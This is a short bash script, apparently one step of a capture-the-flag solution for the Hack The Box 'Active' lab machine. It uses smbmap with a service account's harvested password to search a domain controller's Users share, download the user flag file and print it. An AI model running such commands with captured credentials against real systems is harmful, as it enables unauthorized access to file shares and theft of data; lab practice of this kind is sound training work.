#!/bin/bash

smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt -q;
cat /usr/share/smbmap/10.10.10.100-Users_SVC_TGS_Desktop_user.txt
